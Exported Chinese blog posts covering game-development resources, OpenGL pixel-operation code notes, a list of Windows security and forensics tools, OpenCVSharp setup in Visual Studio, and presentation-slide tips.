中文版豆瓣链接 Level Up! 《通关!游戏设计之道》 豆瓣链接 中文版豆瓣链接 3D Math Primer for Graphics and Game Development 《图形学与游戏开发 3D 数学基础》 豆瓣链接 中文版豆瓣链接 Mathematics For 3D Game Programming And Computer Graphics 《3D 游戏编程与计算机图形数学》 豆瓣链接 Essential Mathematics for Games and Interactive Applications: A Programmer’s Guide 《游戏与交互应用数学精髓：程序员指南》 豆瓣链接 Nature of Code 《代码本色》 豆瓣链接 中文版豆瓣链接 Physics for Game Developers 《游戏开发物理学》 豆瓣链接 中文版豆瓣链接 Programming Game AI by Example 《游戏AI编程范例》 豆瓣链接 中文版豆瓣链接 Real-Time Rendering 《实时渲染》 豆瓣链接 中文版豆瓣链接 Rules of Play 《游戏的法则》 豆瓣链接 The Art of Game Design 《游戏设计艺术》 豆瓣链接 中文版链接 The Ultimate Guide to Video Game Writing and Design 《视频游戏创作设计终极指南》 豆瓣链接 The Visual Story 《以眼说话》 豆瓣链接 中译版豆瓣链接 Theory of Fun 《游戏设计快乐之道》 豆瓣链接 中译版豆瓣链接 Tricks of the Windows Game Programming Gurus 《Windows游戏编程大师技巧》 豆瓣链接 中译版豆瓣链接 ※杂志 Casual Connect 休闲连线，提供全球游戏市场的调研数据。 Game Developer Magazine 游戏开发者杂志。 IndieMag 关注独立游戏的法国杂志。 indie-o-rama 关注独立游戏的杂志。 Making Games 游戏制作杂志。 ※视频/博客 awesome-gametalks 游戏访谈策划单 (GDC，youtube 等) ※知乎专栏 indienova 独立游戏 关注独立游戏的相关内容。介绍、发现独立游戏。 Behind the Pixels 计算机图形学以及3D渲染技术等相关内容。 npc 的方舟 游戏相关的杂谈。 游戏人生 游戏设计师矩阵的知乎专栏。 电子游戏救世界 机核网的知乎专栏。 远古游戏周刊 聊一聊老游戏。 灯塔实验室 独立游戏制作、理论与发现。 游戏设计梦工厂 USC的游戏设计 任意键 游戏杂文 游戏诅咒 游戏评测 界外魔的游戏研究室 游戏设计与理论 化身戏子 游戏设计杂谈 独立游戏手工艺人 游戏开发与设计相关 bylin 的游戏专栏 游戏设计相关 独立游戏大像素 独立游戏观察 ※Game Jams Ludum Dare 最大的线上 game jam 比赛之一。 ※完整游戏源码 Doom 3 Doom Duke Nukem 3D: Atomic Edition Prince of Persia Quake 2 Quake III Arena Quake SimCity Wolfenstein 3D ※广告 我们也还是需要有点收入，对嘛？ AdMob by Google 谷歌推出的移动端广告与支付服务。 AdColony 移动端视频广告服务。 Appodeal 移动端广告与支付服务解决方案。 ChartBoost 支付与数据分析平台。 RevMob 支付与广告解决方案。 Unity Ads Unity3D 官方广告 SDK。 Vungle 视频广告服务。 ※学习资源 new 在线公开课，教程与屏幕录像 ※通用游戏开发 Coursera: Beginning Game Programming with C# 公开课：使用 C# 开始游戏编程 Khan Academy: Advanced JS: Games &amp; Visualizations 可汗大学：高级 JS 编程：游戏与可视化 TheChernoProject 切尔诺计划（专注游戏开发教学的油管频道） Udacity: HTML5 Game Development HTML5 游戏开发课程 Coursera: Introduction to interactive Python programming 公开课：交互式 python 编程导论 HandmadeHero: making 2D game from scratch 手制英雄：从零开始制作 2D 游戏 Simple HTML5 Canvas Game HTML5 画布游戏入门 indienova 译文地址 三百游戏机制 妙趣盎然的游戏机制说明网站，站长是游戏戴斯班克(Death Spank)的文案。 Yoyogames 的 GMS 官方文档 Yoyogames 提供的 GMS 官方文档，研究学习这款引擎必须参考的资料。 ※计算机图形学 Interactive 3D Graphics 交互式 3D 图形学 Interactive Computer Graphics 交互式计算机图形学 ※其他惊艳清单 其他令人赞叹不已的惊艳清单可以在这张 惊艳清单的清单 中找到。 基于 ellisonleao 的 magictools 整理翻译而成。文字内容并非对应原文翻译，我们在原版的基础上增补了一些国内开发者可能会感兴趣的信息，并基于个人理解对一些资源的描述/措辞做了少许改动。本文信息还会持续地保持补充/更新。囿于水平，本文的翻译和整理工作难免存在一些问题和缺憾，如果你有什么更好的建议，欢迎指出。 转载自 https://indienova.com/sp/gameDevResource#完整游戏源码","tags":"游戏开发"},{"title":"OpenGL超级宝典学习笔记操作像素","url":"/20220628/opengl-chao-ji-bao-dian-xue-xi-bi-ji-cao-zuo-xiang-su/","text":"OpenGL支持放大，缩小，旋转图像。下面将举例介绍这些像素的操作。下面的例子是从tga文件中读取图片并显示，而且可以通过右键菜单来选择图像的显示模式和保存图片的快照到磁盘命名为screenshot.tga。完整的代码示例如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &quot;gltools.h&quot;#include &lt;math.h&gt;static GLbyte *pImage = NULL;static GLint iRenderMode = 0;static GLint iWidth, iHeight, iComponents; static GLenum eFormat;void ProcessMenu(int value)&#123; if (value == 1) &#123; //保存图像的快照 gltWriteTGA(&quot;screenshot.tga&quot;); &#125; else &#123; iRenderMode = value; &#125; glutPostRedisplay();&#125;void RenderScene()&#123; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); if (!pImage) &#123; return; &#125; //设置光栅位置 glRasterPos2i(0, 0); //修改的图像，和用于反转的映射数组 GLbyte *pModifyImage = NULL; GLfloat invertMap[256]; switch (iRenderMode) &#123; case 2: //图像倒转 glPixelZoom(-1.0f, -1.0f); //倒转后的图像的,渲染方向也倒转过来了，变成了从右上角开始往左下角渲染，所以设置倒转后的光栅位置为图像的宽高。 glRasterPos2i(iWidth, iHeight); break; case 3: //让图像填充满屏幕 GLint viewport[4]; //取得视口的大小 glGetIntegerv(GL_VIEWPORT, viewport); //按比例缩放 glPixelZoom((GLfloat)viewport[2]/iWidth, (GLfloat)viewport[3]/iHeight); break; case 4: //只保留红色 glPixelTransferf(GL_RED_SCALE, 1.0f); glPixelTransferf(GL_GREEN_SCALE, 0.0f); glPixelTransferf(GL_BLUE_SCALE, 0.0f); break; case 5: //只保留绿色 glPixelTransferf(GL_RED_SCALE, 0.0f); glPixelTransferf(GL_GREEN_SCALE, 1.0f); glPixelTransferf(GL_BLUE_SCALE, 0.0f); break; case 6: //只保留蓝色 glPixelTransferf(GL_RED_SCALE, 0.0f); glPixelTransferf(GL_GREEN_SCALE, 0.0f); glPixelTransferf(GL_BLUE_SCALE, 1.0f); break; case 7: //先渲染图像到颜色缓冲区中 glDrawPixels(iWidth, iHeight, eFormat, GL_UNSIGNED_BYTE, pImage); //NTSC标准,转成黑白图像 glPixelTransferf(GL_RED_SCALE, 0.3f); glPixelTransferf(GL_GREEN_SCALE, 0.59f); glPixelTransferf(GL_BLUE_SCALE, 0.11f); //申请临时空间来保存修改后的图像 pModifyImage = (GLbyte *)malloc(iWidth * iHeight * 3); if (!pModifyImage) &#123; return; &#125; //从颜色缓冲区中读取图像的亮度数据 glReadPixels(0, 0, iWidth, iHeight, GL_LUMINANCE, GL_UNSIGNED_BYTE, pModifyImage); //还原 glPixelTransferf(GL_RED_SCALE, 1.0f); glPixelTransferf(GL_GREEN_SCALE, 1.0f); glPixelTransferf(GL_BLUE_SCALE, 1.0f); break; case 8: //设置反转的颜色映射 invertMap[0] = 1.0f; for(int i = 0; i &lt; 256; ++i) &#123; invertMap[i] = 1.0f - (1.0f / 255.0f * (GLfloat)i); &#125; //映射 glPixelMapfv(GL_PIXEL_MAP_R_TO_R, 255, invertMap); glPixelMapfv(GL_PIXEL_MAP_G_TO_G, 255, invertMap); glPixelMapfv(GL_PIXEL_MAP_B_TO_B, 255, invertMap); //开启颜色映射 glPixelTransferi(GL_MAP_COLOR, GL_TRUE); default: break; &#125; if (pModifyImage) &#123; //画黑白图像 glDrawPixels(iWidth, iHeight, GL_RGB, GL_UNSIGNED_BYTE, pModifyImage); free(pModifyImage); &#125; else &#123; glDrawPixels(iWidth, iHeight, eFormat, GL_UNSIGNED_BYTE, pImage); &#125; //还原 glPixelTransferf(GL_RED_SCALE, 1.0f); glPixelTransferf(GL_GREEN_SCALE, 1.0f); glPixelTransferf(GL_BLUE_SCALE, 1.0f); glPixelZoom(1.0f, 1.0f); glPixelTransferi(GL_MAP_COLOR, GL_FALSE); glutSwapBuffers();&#125;void SetupRC()&#123; glClearColor(0.0f, 0.0f, 0.0f, 1.0f); //设置像素的存储格式 glPixelStorei(GL_UNPACK_ALIGNMENT, 1); //加载图像数据 pImage = gltLoadTGA(&quot;horse.tga&quot;, &amp;iWidth, &amp;iHeight, &amp;iComponents, &amp;eFormat);&#125; //释放图像数据占用的内存空间 void ShutdownRC()&#123; if (pImage) &#123; free(pImage); pImage = NULL; &#125;&#125;void ChangeSize(GLsizei w, GLsizei h)&#123; if (h == 0) h = 1; glViewport(0, 0, w, h); glMatrixMode(GL_PROJECTION); glLoadIdentity(); gluOrtho2D(0.0, (GLdouble)w, 0.0, (GLdouble)h); glMatrixMode(GL_MODELVIEW); glLoadIdentity(); glutPostRedisplay();&#125;int main(int args, char **argv)&#123; glutInit(&amp;args, argv); glutInitDisplayMode(GL_RGB | GL_DOUBLE); glutInitWindowSize(800, 600); glutCreateWindow(&quot;pixel operation&quot;); glutDisplayFunc(RenderScene); glutReshapeFunc(ChangeSize); //设置菜单 int menuID = glutCreateMenu(ProcessMenu); glutAddMenuEntry(&quot;Save Image&quot;, 1); glutAddMenuEntry(&quot;Flip&quot;, 2); glutAddMenuEntry(&quot;zoom pixel fill window&quot;, 3); glutAddMenuEntry(&quot;Just Red&quot;, 4); glutAddMenuEntry(&quot;Just Green&quot;, 5); glutAddMenuEntry(&quot;Just Blue&quot;, 6); glutAddMenuEntry(&quot;black &amp; white&quot;, 7); glutAddMenuEntry(&quot;invert map&quot;, 8); glutAttachMenu(GLUT_RIGHT_BUTTON); SetupRC(); glutMainLoop(); ShutdownRC(); return 0;&#125; SetupRC函数用于加载图像数据，保存图像数据，图像的宽高和格式等信息。 1glClearColor(0.0f, 0.0f, 0.0f, 1.0f); //设置像素的存储格式 glPixelStorei(GL_UNPACK_ALIGNMENT, 1); //加载图像数据 pImage = gltLoadTGA(&quot;horse.tga&quot;, &amp;iWidth, &amp;iHeight, &amp;iComponents, &amp;eFormat); 在程序退出时，记得释放为图像数据分配的内存，在ShutdownRC中释放图像数据 12345if (pImage)&#123; free(pImage); pImage = NULL;&#125; 在main函数中，创建菜单，为每个菜单项分配键值，然后绑定到右键上。 12345678910//设置菜单 int menuID = glutCreateMenu(ProcessMenu);glutAddMenuEntry(&quot;Save Image&quot;, 1);glutAddMenuEntry(&quot;Flip&quot;, 2);glutAddMenuEntry(&quot;zoom pixel fill window&quot;, 3);glutAddMenuEntry(&quot;Just Red&quot;, 4);glutAddMenuEntry(&quot;Just Green&quot;, 5);glutAddMenuEntry(&quot;Just Blue&quot;, 6);glutAddMenuEntry(&quot;black &amp; white&quot;, 7);glutAddMenuEntry(&quot;invert map&quot;, 8);glutAttachMenu(GLUT_RIGHT_BUTTON); 根据所选择的菜单进行相应的操作，默认情况下是通过glDrawPixels函数把图像放置在窗口的左下角显示。第一个菜单项Save Image是保存图像的快照。 ※像素缩放 常见的图像操作，放大和缩小图像。OpenGL提供了一个对图像进行缩放的函数： 1void glPixelZoom(GLfloat xfactor, GLfloat yfactor); xfactor,yfactor指定了在x，y方向上缩放的倍数。图像的缩放包括了放大，缩小和反转。例如：如果x方向上的缩放因子为2，那么图像在x方向上会放大2被。在本例中选择第三项菜单可以把图像填满窗口： 1//让图像填充满屏幕 GLint viewport[4]; //取得视口的大小 glGetIntegerv(GL_VIEWPORT, viewport); //按比例缩放 glPixelZoom((GLfloat)viewport[2]/iWidth, (GLfloat)viewport[3]/iHeight); 如果缩放因子为负值，效果就是沿缩放方向进行反转。此时不仅仅反转了图像中像素的排列顺序，而且也翻转图像根据光栅位置在屏幕上绘制的方向。例如，一般是图像的左下角放置在当前光栅位置，如果两个缩放因子都为负值则图像的右上角被放置在当前光栅位置处: 1//图像倒转 glPixelZoom(-1.0f, -1.0f); //倒转后的图像的,渲染方向也倒转过来了，变成了从右上角���始往左下角渲染，所以设置倒转后的光栅位置为图像的宽高。 glRasterPos2i(iWidth, iHeight); ※像素变换 除了像素的缩放之外，OpenGL还支持对图像进行一些简单的数学操作。把像素转移到颜色缓冲区或者从颜色缓冲区转移出来。可以调用下面两个函数来实现： 123void glPixelTransferi(GLenum pname, GLint param);void glPixelTransferf(GLenum pname, GLfloat param); pname的枚举值如下表： 缩放和偏转参数允许缩放和偏转单独的颜色通道。缩放因子将与颜色成分值相乘，偏转值则与颜色成分值相加。公式如下： 新值 = （旧值 * 缩放因子）+偏转值 默认情况下缩放因子是1.0，偏转值是0.0。如果想让图像只显示红色成分值，则可以设置绿色和蓝色的缩放因子为0.0. 123glPixelTransferf(GL_GREEN_SCALE, 0.0f);glPixelTransferf(GL_BLUE_SCALE, 0.0f); 例子中，分别显示红色，绿色，蓝色成分值的代码： 12345678case 4: //只保留红色 glPixelTransferf(GL_RED_SCALE, 1.0f); glPixelTransferf(GL_GREEN_SCALE, 0.0f); glPixelTransferf(GL_BLUE_SCALE, 0.0f); break; case 5: //只保留绿色 glPixelTransferf(GL_RED_SCALE, 0.0f); glPixelTransferf(GL_GREEN_SCALE, 1.0f); glPixelTransferf(GL_BLUE_SCALE, 0.0f); break; case 6: //只保留蓝色 glPixelTransferf(GL_RED_SCALE, 0.0f); glPixelTransferf(GL_GREEN_SCALE, 0.0f); glPixelTransferf(GL_BLUE_SCALE, 1.0f); break; 在绘制完成后把各个颜色通道的缩放因子复原。 123//还原 glPixelTransferf(GL_RED_SCALE, 1.0f); glPixelTransferf(GL_GREEN_SCALE, 1.0f); glPixelTransferf(GL_BLUE_SCALE, 1.0f); 我们还可以把一幅彩色图像转成黑白颜色来显示。首先把彩色图像渲染到颜色缓冲区中： 1glDrawPixels(iWidth, iHeight, eFormat, GL_UNSIGNED_BYTE, pImage); 然后分配一个用来保存每个像素亮度值的内存空间： 1pModifyImage = (GLbyte *)malloc(iWidth* iHeight); 亮度图像只有一个通道，所以我们只分配一个字节来存储亮度值。把当前颜色缓冲区中的颜色通道进行变换：使用NTSC（美国国家电视系统委员会）标准转成黑白图像 123glPixelTransferf(GL_RED_SCALE, 0.3f);glPixelTransferf(GL_GREEN_SCALE, 0.59f);glPixelTransferf(GL_BLUE_SCALE, 0.11f); 然后通过glReadPixel来从颜色缓冲区中读取图像的亮度值到pModifyImage指向的内存区域中。 1glReadPixel(0, 0, iWidth, iHeight, GL_LUMINANCE, GL_UNSIGNED_BYTE, pModifyImage); 最后把pModifyImage的数据写会颜色缓冲区中： 1glDrawPixel(iWidth, iHeight, GL_LUMINANCE, GL_UNSIGNED_BYTE, pModifyImage); OpenGl把彩色图像转换成亮度图，只是把各个颜色通道的值相加得到亮度值，超过1.0的设置为1.0，这样得到的效果不是很好： 为了得到更好的效果，我们可以通过NTSC标准把彩色图像转换成灰度图。从RGB颜色空间转换到黑白色彩空间的转换公式是： 亮度 = （0.3 红色） + （0.59 绿色） + （0.11 * 蓝色）； 123//NTSC标准 glPixelTransferf(GL_RED_SCALE, 0.3f); glPixelTransferf(GL_GREEN_SCALE, 0.59f); glPixelTransferf(GL_BLUE_SCALE, 0.11f); 得到的效果是更好看的灰度图： OpenGL超级宝典 第4版 中文版PDF+英文版+源代码 见 http://www.linuxidc.com/Linux/2013-10/91413.htm OpenGL编程指南（原书第7版）中文扫描版PDF 下载 http://www.linuxidc.com/Linux/2012-08/67925.htm OpenGL 渲染篇 http://www.linuxidc.com/Linux/2011-10/45756.htm Ubuntu 13.04 安装 OpenGL http://www.linuxidc.com/Linux/2013-05/84815.htm OpenGL三维球体数据生成与绘制【附源码】 http://www.linuxidc.com/Linux/2013-04/83235.htm Ubuntu下OpenGL编程基础解析 http://www.linuxidc.com/Linux/2013-03/81675.htm 如何在Ubuntu使用eclipse for c++配置OpenGL http://www.linuxidc.com/Linux/2012-11/74191.htm 更多《OpenGL超级宝典学习笔记》相关知识 见 http://www.linuxidc.com/search.aspx?where=nkey&amp;keyword=34581 本文永久更新链接地址：http://www.linuxidc.com/Linux/2015-02/114017.htm","tags":"opengl"},{"title":"kali专题","url":"/20220628/kali-zhuan-ti/","text":"搭建 WSL2 下的 Kali 环境（含GUI及空间优化）","tags":"专题 kali 渗透"},{"title":"Windows安全工具锦集","url":"/20220628/windows-an-quan-gong-ju-jin-ji/","text":"※PE工具篇 PEiD 一款著名的PE侦壳工具，可以检测PE常见的一些壳，但是目前已经无法从官网获得： EXEInfoPE PE侦壳工具，PEiD的加强版，可以查看EXE/DLL文件编译器信息、是否加壳、入口点地址、输出表/输入表等等PE信息：下载地址：http://www.exeinfo.xn.pl/ DetectIt Easy 开源的PE侦壳工具，是一个跨平台的应用程序，有Windows、Linux、Mac OS多个可用版本：下载地址：http://ntinfo.biz/index.html CFFExplorer 一款优秀的PE32 &amp;PE64编辑工具，可以方便的查看及编辑PE文件。完全支持.NET文件格式：下载地址：https://ntcore.com/?page_id=388 StudyPE PE32 &amp; PE64 查看分析集成工具，具有强大的PE结构处理分析功能，在查壳方面功能略显薄弱：下载地址：https://bbs.pediy.com/thread-246459-1.htm ※调试/反编译工具篇 OllyDbg Ring3级调试器，支持插件扩展功能，唯一不足的是OD是一个32位调试器，不支持调试64位程序。官方给出的原版程序是无插件的，有需要的童鞋可以在吾爱破解论坛自行搜索：下载地址：http://www.ollydbg.de/ WinDbg 支持Windows平台，用户态和内核态的调试器，有图形界面和命令行两种调试方式。其强大的内核调试功能收获了众多的追捧者：下载地址：https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools x32dbg/x64dbg 一款开源的调试器，从界面和操作使用和OD相似，支持32位和64位应用程序的调试。解决了OD对64位应用程序调试上的缺陷：下载地址：https://x64dbg.com/#start dnSpy 一款针对.NET程序的开源逆向程序的工具。包含了反汇编器，调试器和汇编编辑器等功能组件，支持插件功能：下载地址：https://github.com/0xd4d/dnSpy IDAPro 全称：InteractiveDisassembler Professional，交互式反汇编器专业版，目前最棒的静态反编译工具，是众多安全人士的首选：下载地址：https://www.hex-rays.com/products/ida/ VB Decompiler 针对Visual Basic 5.0/6.0开发的程序的反编译器：下载地址：https://www.vb-decompiler.org/products/cn.htm ※应急工具篇 ※日志相关 Sysmon WindowsSysinternals出品的一款Sysinternals系列中的工具。它以系统服务和设备驱动程序的方法安装在系统上，并保持常驻性。用来监视和记录系统活动，并记录到windows事件日志，可以提供有关进程创建，网络链接和文件创建时间更改的详细信息：下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon LastActivityView 是一款电脑操作记录查看器，直接调用系统日志，显示安装软件、系统启动、关机、网络连接、执行exe 的发生时间和路径：下载地址：http://www.nirsoft.net/utils/computer_activity_view.html ※注册表相关 Regshot 注册表比较工具，通过抓取两次注册表快速比较得出两次注册表的不同之处：下载地址：https://sourceforge.net/projects/regshot/ Autoruns 基于Windows平台的自动运行程序的管理工具。可以控制登录时的加载程序、驱动程序加载、服务启动、任务计划等 Windows 中各种方面的启动项：下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns ※进程相关 ProcessHacker 一款功能丰富的开源系统进程辅助工具，可以方便的查看进程的运行情况、内存以及模块信息，还可以对进程进行管理：下载地址：https://processhacker.sourceforge.io/ PowerTool 一款免费的进程管理器，可以Unlock占用文件的进程，查看文件或文件夹被占用的情况，内核模块和驱动的查看管理，进程模块的内存dump等工具：下载地址：https://www.portablesoft.org/ ProcessLasso 一款独特的调试进程级别的系统优化工具，主要功能是基于其特别的算法动态调整各个进程优先级以实现为系统减负的目的。可以用来监视进程动作：下载地址：https://bitsum.com/ ※文件相关 HashTab 文件校验工具，分为免费个人版以及付费版。下载安装后可以通过查看文件属性中的HashTab快速得到文件的哈希值，支持多种哈希算法：下载地址：http://implbits.com/products/hashtab/ HashChecker 一款开源的文件校验工具，安装完成后可以通过文件属性中的文件校验快速得到文件的哈希值。支持右键菜单创建校验文件功能和批量校验功能：下载地址：http://code.kliu.org/hashcheck/ Unlocker 一款右键扩充工具，通过删除文件和程序关联的方式解除文件的占用。在解除占用时不会强制关闭占用文件进程：下载地址：http://emptyloop.com/unlocker/ Everything 强大的Windows桌面搜索引擎，可以在NTFS卷上快速的根据名称查找文件和目录：下载地址：https://www.voidtools.com/zh-cn/ Winhex 是一款优秀的十六进制编辑器，在计算机取证，数据恢复，低级数据处理和IT安全领域非常有用：下载地址：https://www.x-ways.net/winhex/ BinDiff 一款开源的二进制文件对比工具，可帮助安全人员快速发现反汇编代码中的差异和相似之处。支持x86、MIPS、ARM/AArch64、PowerPC等架构进行二进制文件的对比：下载地址：https://www.zynamics.com/software.html BeyondCompare 一款由ScooterSoftware推出的文件比较工具。主要用于比较两个文件夹或者文件并将差异以颜色标记，比较的范围包括目录，文档内容等：下载地址：http://www.beyondcompare.cc/xiazai.html ※内存相关 SfAntiBotPro 内存检索工具，可以根据输入的字符串快速检索计算机内存，输出包含该字符串的进程信息，在进行恶意域名检测时有事半功倍的效果：下载地址：（32位）http://edr.sangfor.com.cn/tool/SfabAntiBot_X86.7z （64位）http://edr.sangfor.com.cn/tool/SfabAntiBot_X64.7z DumpIt 是一款免安装的Windows内存镜像取证工具，可以使用其轻松的将一个系统的完整内存镜像下来，并用于后续的调查取证工作：下载地址：https://my.comae.com/tools ※设备监控 USBLogView 一款USB设备监控软件，后台运行，可以记录插入或拔出系统的任何USB的详情信息：下载地址：https://www.nirsoft.net/utils/usb_log_view.html ※集成工具 PC Hunter 一款驱动级的系统维护工具，能够查看各种Windows的各类底层系统信息，包括进程、驱动模块、内核、内核钩子、应用层钩子，网络、注册表、文件、启动项、系统杂项、电脑体检等：下载地址：http://www.xuetr.com/ MalwareDefender 一款 HIPS (主机入侵防御系统)软件，用户可以自己编写规则来防范病毒、木马的侵害。另外，MalwareDefender提供了很多有效的工具来检测和删除已经安装在您的计算机系统中的恶意软件：下载地址：https://labs.360.cn/malwaredefender/ 火绒剑 一款用于分析、处理恶意程序的安全工具软件，提供了“程序行为监控”、“进程管理”、“文件管理”、“注册表管理”、“系统启动项管理”、”内核程序管理“、“代码钩子扫描”七大功能：下载地址：（火绒剑独立版，不支持win8.1以上的系统） ※流量分析工具篇 WireShark 一款网络封包分析工具，可以帮助用户深入分析网络协议，涵盖上百种协议以及各类主要平台。通过GUI或TTY-mode浏览数据：下载地址：wireshark.org/download.html Fiddler C#编写的http抓包改包工具，相较wireshark更加轻量级，在http和https数据包的抓取上更加专业。还能设置断点，修改请求和响应的数据，模拟弱网络环境。支持插件扩展:下载地址：https://www.telerik.com/download/fiddler MicrosoftNetwork Monitor 只支持Windows平台的网络数据分析工具，提供了一个专业的网路实时流量图形界面，拥有识别和监控超过300种网络协议的能力：下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=4865 CapsaPacket Sniffer 网络分析工具，用于网络监控、故障排除和网络诊断等功能：下载地址：https://www.colasoft.com/capsa-free/ NetworkMiner 支持Windows平台的网络取证分析工具，通过嗅探或者分析PCAP文件可以侦测到操作系统，主机名和开放的网络端口主机：下载地址：https://sourceforge.net/projects/networkminer/files/networkminer/ AngryIP Scanner 这是一款开源的网络扫描仪，支持Linux，Windows和Mac OS X平台，可以在最短的时间内扫描远端主机IP运作情况，包括主机名，目前开放的端口和IP的运作情况：下载地址：https://angryip.org ※WebShell查杀工具篇 D盾 D盾是一个专为IIS设计的主动防御保护软件，有一句话免疫，主动后门拦截，SESSION保护，防WEB嗅探，防CC，防篡改，注入防御，防XSS，防提权，上传防御，未知0day防御，异形脚本防御等功能，以内外保护的方式防止网站和服务器被入侵。下载地址：http://www.d99net.net/ WebShellKiller WebShellKiller是个Web后门专杀工具，不仅支持Webshell扫描，还支持暗链扫描。该工具将传统的技术与人工智能技术相结合、静态扫描和动态分析相结合，更精准的检测出Web网站已知和未知的后门文件：下载地址：（Windows平台）https://edr.sangfor.com.cn/tool/WebShellKillerTool.zip （Linux平台）http://edr.sangfor.com.cn/api/download/WebShellKillerForLinux.tar.gz WEBDIR+ 在线WebShell扫描器：链接地址：https://scanner.baidu.com/#/pages/intro WebShellDetector 在线WebShell扫描器：链接地址：http://www.shelldetector.com WEBSHELL.PUB 在线WebShell扫描器：下载链接：http://www.shellpub.com 引用自：https://www.freebuf.com/sectool/215644.html","tags":"安全工具"},{"title":"OpenCV在Csharp中应用OpenCVSharp","url":"/20220628/opencv-zai-csharp-zhong-ying-yong-opencvsharp/","text":"※Opencv特辑 ※OpenCV在Csharp中应用—OpenCVSharp ※什么是OpenCVSharp 之前一直是基于OpenCV开发视觉算法，但C语言对于GUI的开发相对于C#来说确实很不方便，之前就了解到C#下使用OpenCV可以使用EmguCV，这段时间也确实是调通了，但是是通过把C封装成动态链接库在C#中调用，这样在修改算法的过程中就会非常的不方便，封装DLL的时候也比较麻烦。在C#中除了Emgucv之外，还有一种叫做OpenCVSharp的工具，从名字就可以看出其是OpenCV提供给C#的接口。OpenCVSharp是OpenCV的.NET wrapper，它比Emgucv更接近于原始的OpenCV，并且有很多的样例参考，其采用LGPL发行，对商业应用友好（基本上相当于BSD）。 ※OpenCVSharp有什么特点 直接封装了更多的OpenCV方法，降低了学习的难度，比EmguCV更便于使用大部分继承了IDisposable接口，方便使用using语句可以直接调用原始风格的OpenCV方法可以将图像对象直接转换成GDI使用的Bitmap和WPF的WriteBitmap支持Mono。 ※OpenCVSharp在VS中的环境配置 相比较OpenCV配置比较麻烦，OpenCVSharp和EmguCV一样，其不需额外的系统环境配置，只需要对项目进行简单的配置即可使用。安装OpenCVSharp有两种方式：一种是使用NuGet（库程序包管理器）；另一种直接下载安装包。 第一种方式：使用NuGet（库程序包管理器），首先打开VS，在【工具】选项中是否有【库程序包管理器】没有的话自己去安装好NuGet. https://jingyan.baidu.com/article/066074d636fd19c3c21cb0a2.html（转载自百度）安装好之后，打开【工具】-&gt;【库程序包管理器】-&gt;【管理解决方案的NuGet程序包】，在其中搜索OpenCVSharp&gt;，选择合适的点击【安装】（最好安装最新的）。一直等待完成。完成安装之后，需要将安装文件的DLL文件放置在项目可执行文件的Debug文件夹下. 第二种方式是直接下载安装包 https://github.com/shimat/opencvsharp/releases 下载好之后解压到一个文件夹（任意的文件夹）VS中OpenCVSharp的配置 文件安装好之后，在【解决方案】中右键【引用】-&gt;【添加引用】，选择【浏览】，将下载文件中的OpenCvSharp.dll文件添加进引用。将下载文件中的OpenCvSharpExtern.dll复制到可执行文件的Debug文件夹下，所有配置OK，下面测试是否配置成功。 ※测试代码 12345678910111213141516171819using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using OpenCvSharp; //添加相应的引用即可namespace OpenCVSharpTest2&#123;class Program &#123; static void Main(string[] args) &#123; Mat source = new Mat(@&quot;1.bmp&quot;, ImreadModes.Color); Cv2.ImShow(&quot;Demo&quot;, source); Cv2.WaitKey(0); &#125;&#125;&#125; ———————————————— 版权声明：本文为CSDN博主「jameshater」的原创文章，遵循CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/jameshater/article/details/79642384","tags":"opencv"},{"title":"关于PPT","url":"/20220628/guan-yu-ppt/","text":"【绝招一：文字是用来瞟的，不是读的 】 我们时不时听到这样的言论：“PPT很简单，就是把Word里的文字复制、粘贴呗。”这其实是对PPT的一种无知与亵渎。如果直接把文字复制粘贴就能达到演示的效果，PPT根本就没有存在的必要了。 PPT的本质在于可视化，就是要把原来看不见、摸不着、晦涩难懂的抽象文字转化为由图表、图片、动画及声音所构成的生动场景，以求通俗易懂、栩栩如生。 形象，至少能给你带来三方面的感受： 一是便于理解。 文字总是高度抽象的，人们需要默读、需要转换成自己的语言、需要上下联想、需要寻找其中的逻辑关系；但人们看电影就轻松许多，只需要跟着故事的发展顺理成章地享受其情节、体味其寓意就行了。PPT就是要把这些文字变得像电影一样生动。 二是放松身心。 如果把一本小说贴在墙上，相信你看半个小时就会腰酸背痛；如果把小说拍成电视剧，也许你看上一天也不觉得疲惫。就是这个道理。三是容易记忆。传统的PPT，你需要观众记住的是文字，这个难度太大了，即使记住了也很容易忘记；而形象化PPT，可以让观众轻松记住其中的图形、逻辑或结论，也许三五年后，人们仍然能够记忆犹新。 改变那种“复制、粘贴”的做法吧！把那些无关紧要的内容大胆删除，把长篇大论的文字尽量提炼，也许刚开始你不习惯，也许你做得还很粗糙，别放弃，总有一天你会让观众赞不绝口的。有的领导会问：“如果PPT没有文字，你让我讲什么？”的确，演示习惯的改变不是一朝一夕的事情，这依赖于演示者对内容的熟悉程度和演示技巧的掌握程度，但有一点，带着观众读文字是演示的大忌，杜绝这一条，演示效果会逐步得到提升。 所以，锐普 PPT 提出了两个观点：1、文字是用来瞟的，凡是瞟一眼看不清的地方，就要放大，放大还看不清的，删！2、文字是PPT的天敌。能减则减，能少则少，能转图片转图片，能转图表转图表。 【 绝招二：20分钟是快乐的极限 】 传统上，我们总是认为，讲得越多，时间越长，越体现出演示者的重视。这是计划经济时代的标准。现在，无论我们的领导、客户还是普通的受众，时间都极为宝贵，没有人愿意阅读动辄数百页的研究报告，也没有人去听你的长篇大论。浓缩的才是精品！演示的核心内容是什么？观点！在此基础上把观众容易困惑的地方、你认为重要的地方作一些说明。 永远不要担心你的演示过短，如果花费20分钟就能够把一天才能了解的内容讲清楚，你实际上为观众节省了 7小时40分，在时间就是金钱的年代，观众当然求之不得。简短的另一个好处是意犹未尽。如果你的演示足够精彩，会给观众留下更多的期待和回味，甚至会有人要求把你的PPT拷回去好好研究几遍呢。简短，也对PPT提高了要求。你需要了解哪些内容是观众最关心的，哪些内容是非讲不可的，哪些内容是能带来震撼的，据此，该合并的合并，该删减的删减。也许，这是一个反复的过程，但标准只有一个： 不要让观众有打哈欠的时间。 【 绝招三：清晰比什么都重要 】 PPT有一个致命的弱点——观众容易迷失思路。 